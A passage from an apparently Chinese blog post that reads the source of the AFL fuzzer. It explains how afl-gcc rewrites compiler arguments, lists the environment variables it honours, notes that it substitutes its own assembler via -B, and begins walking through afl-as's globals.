class="string">&quot;g++&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;afl-gcj&quot;</span>)) &#123;</span><br><span class="line">      u8* alt_cc = <span class="built_in">getenv</span>(<span class="string">&quot;AFL_GCJ&quot;</span>);</span><br><span class="line">      cc_params[<span class="number">0</span>] = alt_cc ? alt_cc : (u8*)<span class="string">&quot;gcj&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      u8* alt_cc = <span class="built_in">getenv</span>(<span class="string">&quot;AFL_CC&quot;</span>);</span><br><span class="line">      cc_params[<span class="number">0</span>] = alt_cc ? alt_cc : (u8*)<span class="string">&quot;gcc&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* __APPLE__ */</span></span></span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (--argc) &#123;</span><br><span class="line">    u8* cur = *(++argv);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(cur, <span class="string">&quot;-B&quot;</span>, <span class="number">2</span>)) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!be_quiet) <span class="built_in">WARNF</span>(<span class="string">&quot;-B is already set, overriding&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!cur[<span class="number">2</span>] &amp;&amp; argc &gt; <span class="number">1</span>) &#123; argc--; argv++; &#125;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(cur, <span class="string">&quot;-integrated-as&quot;</span>)) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(cur, <span class="string">&quot;-pipe&quot;</span>)) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(__FreeBSD__) &amp;&amp; defined(__x86_64__)</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(cur, <span class="string">&quot;-m32&quot;</span>)) m32_set = <span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(cur, <span class="string">&quot;-fsanitize=address&quot;</span>) ||</span><br><span class="line">        !<span class="built_in">strcmp</span>(cur, <span class="string">&quot;-fsanitize=memory&quot;</span>)) asan_set = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(cur, <span class="string">&quot;FORTIFY_SOURCE&quot;</span>)) fortify_set = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    cc_params[cc_par_cnt++] = cur;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  cc_params[cc_par_cnt++] = <span class="string">&quot;-B&quot;</span>;</span><br><span class="line">  cc_params[cc_par_cnt++] = as_path;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (clang_mode)</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-no-integrated-as&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_HARDEN&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fstack-protector-all&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!fortify_set)</span><br><span class="line">      cc_params[cc_par_cnt++] = <span class="string">&quot;-D_FORTIFY_SOURCE=2&quot;</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (asan_set) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Pass this on to afl-as to adjust map density. */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">setenv</span>(<span class="string">&quot;AFL_USE_ASAN&quot;</span>, <span class="string">&quot;1&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_USE_ASAN&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_USE_MSAN&quot;</span>))</span><br><span class="line">      <span class="built_in">FATAL</span>(<span class="string">&quot;ASAN and MSAN are mutually exclusive&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_HARDEN&quot;</span>))</span><br><span class="line">      <span class="built_in">FATAL</span>(<span class="string">&quot;ASAN and AFL_HARDEN are mutually exclusive&quot;</span>);</span><br><span class="line"></span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-U_FORTIFY_SOURCE&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fsanitize=address&quot;</span>;</span><br><span class="line"></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_USE_MSAN&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_USE_ASAN&quot;</span>))</span><br><span class="line">      <span class="built_in">FATAL</span>(<span class="string">&quot;ASAN and MSAN are mutually exclusive&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_HARDEN&quot;</span>))</span><br><span class="line">      <span class="built_in">FATAL</span>(<span class="string">&quot;MSAN and AFL_HARDEN are mutually exclusive&quot;</span>);</span><br><span class="line"></span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-U_FORTIFY_SOURCE&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fsanitize=memory&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">getenv</span>(<span class="string">&quot;AFL_DONT_OPTIMIZE&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(__FreeBSD__) &amp;&amp; defined(__x86_64__)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* On 64-bit FreeBSD systems, clang -g -m32 is broken, but -m32 itself</span></span><br><span class="line"><span class="comment">       works OK. This has nothing to do with us, but let&#x27;s avoid triggering</span></span><br><span class="line"><span class="comment">       that bug. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!clang_mode || !m32_set)</span><br><span class="line">      cc_params[cc_par_cnt++] = <span class="string">&quot;-g&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"></span><br><span class="line">      cc_params[cc_par_cnt++] = <span class="string">&quot;-g&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-O3&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-funroll-loops&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Two indicators that you&#x27;re building for fuzzing; one of them is</span></span><br><span class="line"><span class="comment">       AFL-specific, the other is shared with libfuzzer. */</span></span><br><span class="line"></span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-D__AFL_COMPILER=1&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION=1&quot;</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_NO_BUILTIN&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fno-builtin-strcmp&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fno-builtin-strncmp&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fno-builtin-strcasecmp&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fno-builtin-strncasecmp&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fno-builtin-memcmp&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fno-builtin-strstr&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fno-builtin-strcasestr&quot;</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  cc_params[cc_par_cnt] = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="1-初始化和内存分配"><a href="#1-初始化和内存分配" class="headerlink" title="1. 初始化和内存分配"></a>1. 初始化和内存分配</h5><p>功能：</p><ul><li><p>初始化状态标志变量</p></li><li><p>分配参数数组内存（原参数数 + 128个额外槽位）</p></li><li><p>使用AFL的安全内存分配函数</p></li></ul><h5 id="2-确定编译器类型和路径"><a href="#2-确定编译器类型和路径" class="headerlink" title="2. 确定编译器类型和路径"></a>2. 确定编译器类型和路径</h5><p>编译器选择逻辑：</p><table><thead><tr><th align="left">调用名称</th><th align="left">默认编译器</th><th align="left">环境变量覆盖</th></tr></thead><tbody><tr><td align="left">afl-clang++</td><td align="left">clang++</td><td align="left">$AFL_CXX</td></tr><tr><td align="left">afl-clang</td><td align="left">clang</td><td align="left">$AFL_CC</td></tr><tr><td align="left">afl-g++</td><td align="left">g++</td><td align="left">$AFL_CXX</td></tr><tr><td align="left">afl-gcj</td><td align="left">gcj</td><td align="left">$AFL_GCJ</td></tr><tr><td align="left">afl-gcc</td><td align="left">gcc</td><td align="left">$AFL_CC</td></tr></tbody></table><h5 id="3-macOS特殊处理"><a href="#3-macOS特殊处理" class="headerlink" title="3. macOS特殊处理"></a>3. macOS特殊处理</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __APPLE__</span></span><br><span class="line"><span class="keyword">if</span> (!cc_params[<span class="number">0</span>]) &#123;</span><br><span class="line">    <span class="built_in">SAYF</span>(<span class="string">&quot;\n&quot;</span> cLRD <span class="string">&quot;[-] &quot;</span> cRST</span><br><span class="line">         <span class="string">&quot;On Apple systems, &#x27;gcc&#x27; is usually just a wrapper for clang. Please use the\n&quot;</span></span><br><span class="line">         <span class="string">&quot;    &#x27;afl-clang&#x27; utility instead of &#x27;afl-gcc&#x27;. If you really have GCC installed,\n&quot;</span></span><br><span class="line">         <span class="string">&quot;    set AFL_CC or AFL_CXX to specify the correct path to that compiler.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">FATAL</span>(<span class="string">&quot;AFL_CC or AFL_CXX required on MacOS X&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>原因：在macOS上，gcc通常是clang的别名，需要明确指定编译器路径。</p><h5 id="4-处理原始编译参数"><a href="#4-处理原始编译参数" class="headerlink" title="4. 处理原始编译参数"></a>4. 处理原始编译参数</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (--argc) &#123;</span><br><span class="line">    u8* cur = *(++argv);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(cur, <span class="string">&quot;-B&quot;</span>, <span class="number">2</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!be_quiet) <span class="built_in">WARNF</span>(<span class="string">&quot;-B is already set, overriding&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!cur[<span class="number">2</span>] &amp;&amp; argc &gt; <span class="number">1</span>) &#123; argc--; argv++; &#125;</span><br><span class="line">        <span class="keyword">continue</span>;  <span class="comment">// 跳过-B参数，AFL会设置自己的-B</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(cur, <span class="string">&quot;-integrated-as&quot;</span>)) <span class="keyword">continue</span>;  <span class="comment">// 跳过</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(cur, <span class="string">&quot;-pipe&quot;</span>)) <span class="keyword">continue</span>;           <span class="comment">// 跳过</span></span><br><span class="line">    </span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(__FreeBSD__) &amp;&amp; defined(__x86_64__)</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(cur, <span class="string">&quot;-m32&quot;</span>)) m32_set = <span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 检测ASAN和FORTIFY_SOURCE</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(cur, <span class="string">&quot;-fsanitize=address&quot;</span>) || </span><br><span class="line">        !<span class="built_in">strcmp</span>(cur, <span class="string">&quot;-fsanitize=memory&quot;</span>)) asan_set = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(cur, <span class="string">&quot;FORTIFY_SOURCE&quot;</span>)) fortify_set = <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    cc_params[cc_par_cnt++] = cur;  <span class="comment">// 保留其他参数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参数处理策略：</p><ul><li><p>跳过的参数：<code>-B, -integrated-as, -pipe</code></p></li><li><p>检测的参数：<code>-fsanitize=*, FORTIFY_SOURCE</code></p></li><li><p>特殊标记：FreeBSD x64下的-m32</p></li><li><p>保留的参数：其他所有参数</p></li></ul><h5 id="5-添加AFL特定参数"><a href="#5-添加AFL特定参数" class="headerlink" title="5. 添加AFL特定参数"></a>5. 添加AFL特定参数</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cc_params[cc_par_cnt++] = <span class="string">&quot;-B&quot;</span>;</span><br><span class="line">cc_params[cc_par_cnt++] = as_path;  <span class="comment">// 指向AFL的汇编器包装器</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (clang_mode)</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-no-integrated-as&quot;</span>;</span><br></pre></td></tr></table></figure><p>功能：</p><ul><li><p>强制使用AFL的汇编器包装器</p></li><li><p>Clang模式下禁用集成汇编器</p></li></ul><p>加固措施：</p><ul><li><p>启用栈保护：-fstack-protector-all</p></li><li><p>启用FORTIFY_SOURCE：-D_FORTIFY_SOURCE&#x3D;2（如果未设置）</p></li></ul><h5 id="6-内存检测工具支持"><a href="#6-内存检测工具支持" class="headerlink" title="6. 内存检测工具支持"></a>6. 内存检测工具支持</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (asan_set) &#123;</span><br><span class="line">    <span class="built_in">setenv</span>(<span class="string">&quot;AFL_USE_ASAN&quot;</span>, <span class="string">&quot;1&quot;</span>, <span class="number">1</span>);  <span class="comment">// 通知afl-as调整映射密度</span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_USE_ASAN&quot;</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_USE_MSAN&quot;</span>))</span><br><span class="line">        <span class="built_in">FATAL</span>(<span class="string">&quot;ASAN and MSAN are mutually exclusive&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_HARDEN&quot;</span>))</span><br><span class="line">        <span class="built_in">FATAL</span>(<span class="string">&quot;ASAN and AFL_HARDEN are mutually exclusive&quot;</span>);</span><br><span class="line">        </span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-U_FORTIFY_SOURCE&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fsanitize=address&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_USE_MSAN&quot;</span>)) &#123;</span><br><span class="line">    <span class="comment">// 类似的MSAN处理逻辑</span></span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-U_FORTIFY_SOURCE&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fsanitize=memory&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>互斥性检查：</p><ul><li><p>ASAN与MSAN不能同时使用</p></li><li><p>ASAN&#x2F;MSAN与AFL_HARDEN不能同时使用</p></li></ul><h5 id="7-优化和调试选项"><a href="#7-优化和调试选项" class="headerlink" title="7. 优化和调试选项"></a>7. 优化和调试选项</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="built_in">getenv</span>(<span class="string">&quot;AFL_DONT_OPTIMIZE&quot;</span>)) &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(__FreeBSD__) &amp;&amp; defined(__x86_64__)</span></span><br><span class="line">    <span class="keyword">if</span> (!clang_mode || !m32_set)</span><br><span class="line">        cc_params[cc_par_cnt++] = <span class="string">&quot;-g&quot;</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-g&quot;</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-O3&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-funroll-loops&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 模糊测试标识宏</span></span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-D__AFL_COMPILER=1&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION=1&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>默认优化设置：</p><ul><li><p>启用调试信息：-g</p></li><li><p>高级优化：-O3</p></li><li><p>循环展开：-funroll-loops</p></li><li><p>定义模糊测试宏</p></li></ul><p>FreeBSD特殊处理：在64位FreeBSD系统上，clang -g -m32有bug，需要特殊处理。</p><h5 id="8-禁用内建函数优化-AFL-NO-BUILTIN"><a href="#8-禁用内建函数优化-AFL-NO-BUILTIN" class="headerlink" title="8. 禁用内建函数优化 (AFL_NO_BUILTIN)"></a>8. 禁用内建函数优化 (AFL_NO_BUILTIN)</h5><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">getenv</span>(<span class="string">&quot;AFL_NO_BUILTIN&quot;</span>)) &#123;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fno-builtin-strcmp&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fno-builtin-strncmp&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fno-builtin-strcasecmp&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fno-builtin-strncasecmp&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fno-builtin-memcmp&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fno-builtin-strstr&quot;</span>;</span><br><span class="line">    cc_params[cc_par_cnt++] = <span class="string">&quot;-fno-builtin-strcasestr&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>目的：</p><ul><li><p>禁用字符串比较函数的编译器优化</p></li><li><p>确保这些函数调用能被AFL的插桩捕获</p></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cc_params[cc_par_cnt] = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure><h5 id="环境变量支持"><a href="#环境变量支持" class="headerlink" title="环境变量支持"></a>环境变量支持</h5><table><thead><tr><th align="left">环境变量</th><th align="left">功能</th><th align="left">默认值</th></tr></thead><tbody><tr><td align="left">AFL_CC</td><td align="left">指定C编译器路径</td><td align="left">gcc&#x2F;clang</td></tr><tr><td align="left">AFL_CXX</td><td align="left">指定C++编译器路径</td><td align="left">g++&#x2F;clang++</td></tr><tr><td align="left">AFL_GCJ</td><td align="left">指定GCJ编译器路径</td><td align="left">gcj</td></tr><tr><td align="left">AFL_HARDEN</td><td align="left">启用安全加固选项</td><td align="left">无</td></tr><tr><td align="left">AFL_USE_ASAN</td><td align="left">启用AddressSanitizer</td><td align="left">无</td></tr><tr><td align="left">AFL_USE_MSAN</td><td align="left">启用MemorySanitizer</td><td align="left">无</td></tr><tr><td align="left">AFL_DONT_OPTIMIZE</td><td align="left">禁用默认优化</td><td align="left">无</td></tr><tr><td align="left">AFL_NO_BUILTIN</td><td align="left">禁用内建函数优化</td><td align="left">无</td></tr></tbody></table><h3 id="execvp"><a href="#execvp" class="headerlink" title="execvp"></a>execvp</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">execvp</span>(cc_params[<span class="number">0</span>], (<span class="type">char</span>**)cc_params);</span><br></pre></td></tr></table></figure><p>就是执行编译相应的源文件</p><p>至此afl-gcc就分析完毕</p><h2 id="编译执行过程"><a href="#编译执行过程" class="headerlink" title="编译执行过程"></a>编译执行过程</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gcc -g -fno-stack-protector -z execstack -no-pie -z norelro /home/cyberangel/Desktop/test/test.c \</span><br><span class="line">  -o  /home/cyberangel/Desktop/test/test_fuzz_gcc_source \</span><br><span class="line">  -B  /usr/local/lib/afl -g -O3 \</span><br><span class="line">  -funroll-loops -D__AFL_COMPILER=1 \</span><br><span class="line">  -DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION=1</span><br></pre></td></tr></table></figure><blockquote><p>这里用cyberangel师傅提供的例子做一个记录</p></blockquote><p>会发现最后execvp的命令是这一串，我们可以通过-B来指定我们自己的as（汇编器）</p><p>gcc编译大多都认为是以下四个步骤：</p><ul><li>预处理，生成预编译文件（**.i**文件）：<code>gcc –E main.c –o main.i</code><ul><li>文件包含(<code>#include</code>)、添加行号和文件名标识、宏定义展开及处理(<code>#define</code>)、条件编译处理(<code>#ifdef</code>)、清理注释内容、特殊控制处理(<code>#pragma/#error</code>)</li></ul></li><li>编译，生成汇编代码（**.s**文件）：<code>gcc –S main.i –o main.s</code><ul><li>词法分析、语法分析、语义分析、代码优化</li></ul></li><li>汇编，生成目标文件（**.o**文件）：<code>gcc –c main.s –o main.o</code><ul><li>汇编-&gt;可执行机器码</li></ul></li><li>链接，生成可执行文件（<strong>executable</strong>文件）：<code>gcc main.o –o main</code></li></ul><p>会发现上述的gcc只指定了特殊的as（即汇编器），因此可以猜测出是通过劫持汇编器来达到在特殊位置插入特殊函数的结果，因此接下来看一手afl的as源码</p><h2 id="afl-as源码阅读"><a href="#afl-as源码阅读" class="headerlink" title="afl-as源码阅读"></a>afl-as源码阅读</h2><p><strong>核心数据结构和全局变量：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> u8** as_params;          <span class="comment">/* 传递给真实 &#x27;as&#x27; 的参数 */</span></span><br><span class="line"><span class="type">static</span> u8*  input_file;         <span class="comment">/* 原始输入文件 */</span></span><br><span class="line"><span class="type">static</span> u8*  modified_file;      <span class="comment">/* 插桩后的文件 */</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> u8   be_quiet,           <span class="comment">/* 静默模式 */</span></span><br><span class="line">            clang_mode,         <span class="comment">/* 是否运行在 clang 模式 */</span></span><br><span class="line">            pass_thru,          <span class="comment">/* 是否直接传递数据 */</span></span><br><span class="line">            just_version,       <span class="comment">/* 只显示版本信息 */</span></span><br><span class="line">            sanitizer;          <span class="comment">/* 是否使用 ASAN/MSAN */</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> u32  inst_ratio = <span class="number">100</span>,   <span class="comment">/* 插桩概率（%） */</span></span><br><span class="line">            as_par_cnt = <span class="number">1</span>;     <span class="comment">/* &#x27;as&#x27; 参数数量 */</span></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Main entry point */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> </span>&#123;</span><br><span 